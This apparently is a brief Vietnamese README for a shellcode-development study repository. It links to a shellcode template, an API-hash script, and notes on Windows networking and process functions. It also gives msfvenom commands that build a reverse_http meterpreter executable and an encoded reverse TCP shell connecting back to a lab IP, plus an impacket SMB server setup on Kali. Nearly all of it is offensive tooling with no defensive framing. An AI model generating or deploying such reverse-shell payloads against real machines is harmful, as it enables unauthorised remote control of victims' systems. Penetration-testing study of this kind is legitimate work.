[File shellcode template ](./shellcode/shellcode.py)

[File tình hash tên hàm](./shellcode/computehash.py)

### Một số hàm
[CopyFileA](./Functions/CopyFileA/README.md) 

[CreateProccessA](./Functions/CreateProcessA/README.md) 

[GetUserNameA](./Functions/GetUserNameA/README.md) 

[GetUserProfileDirectoryA](./Functions/GetUserProfileDirectoryA/README.md) 

[LoadLibraryA](./Functions/LoadLibraryA/README.md) 

[MoveFileA](./Functions/MoveFileA/README.md) 

[TerminateProccess](./Functions/TerminateProccess/README.md) 

[WSAConnect](./Functions/WSAConnect/README.md) 

[WSASocketA](./Functions/WSASocketA/README.md) 

[WSAStartup](./Functions/WSAStartup/README.md) 


- Tạo meterpreter:
  - msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.119.120 LPORT=8080 -f exe -v met.exe
    
  - msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.120 LPORT=8080 -f python –e x86/shikata_ga_nai -b "\x00..."
    

- Cài pwntool
  - python3 -m pip install --upgrade pip

  - python3 -m pip install --upgrade pwntools

- Setup smbserver trên kali:

sudo impacket-smbserver met /home/kali -smb2support

